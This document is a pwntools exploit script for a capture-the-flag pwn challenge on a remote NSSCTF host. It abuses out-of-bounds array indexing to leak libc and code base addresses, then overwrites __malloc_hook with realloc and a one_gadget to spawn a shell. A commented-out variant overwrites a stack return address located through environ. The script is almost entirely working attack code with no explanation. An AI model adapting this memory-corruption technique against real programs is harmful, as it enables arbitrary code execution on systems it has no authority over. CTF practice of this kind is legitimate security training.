from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote("node4.anna.nssctf.cn", 28299)
elf = ELF("./pwn")
#libc = elf.libc
libc = ELF("../silverwolf/libc-2.27.so")

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'Your choice: '
def r(idx):
	sla(menu, b'1')
	sda(b'Index: ', idx)

def w(idx, value = 0, flag = True):
	sla(menu, b'2')
	sla(b'Index: ', byte(idx))
	if flag:
		sd(value)

w(256, 0, False)
w(256, 0, False)

r(p64(0xFFFFFFFFFFFFFFFC))
rut(b'Result: ')
libc.address = int(rut(b'\n'), 16) - libc.symbols['_IO_2_1_stderr_']
malloc_hook = libc.symbols['__malloc_hook']
realloc = libc.symbols['realloc']
print("libc_base : ", hex(libc.address))
print("malloc_hook : ", hex(malloc_hook))
print("realloc : ", hex(realloc))

r(p64(0xFFFFFFFFFFFFFFF5))
rut(b'Result: ')
code_base = int(rut(b'\n'), 16) - 0x202008
print("code_base : ", hex(code_base))

malloc_offset = (malloc_hook - code_base - 0x202060) // 8
print("malloc_offset : ", hex(malloc_offset))

"""
  rcx == NULL
  [rsp+0x40] == NULL
  [rsp+0x70] == NULL
"""

ones = [0x4f3d5, 0x4f432, 0x10a41c] # remote
#ones = [0x4f2a5, 0x4f302, 0x10a2fc] # local
ones = [i+libc.address for i in ones]
print(ones)

# 打hook
w(malloc_offset, p64(realloc+4))
w(malloc_offset-1, p64(ones[2]))
#debug()
sla(menu, b'1'*0x400)
"""

# 打ret
environ_offset = (libc.symbols['environ'] - code_base - 0x202060) // 8
print("environ_offset : ", hex(environ_offset))
r(p64(environ_offset))
rut(b'Result: ')
environ = int(rut(b'\n'), 16)
ret_addr = environ - 0x120
print("environ : ", hex(environ))
print("ret_addr : ", hex(ret_addr))
ret_offset = (ret_addr - code_base - 0x202060) // 8
#debug()
w(ret_offset, p64(ones[0]))
"""

sh()
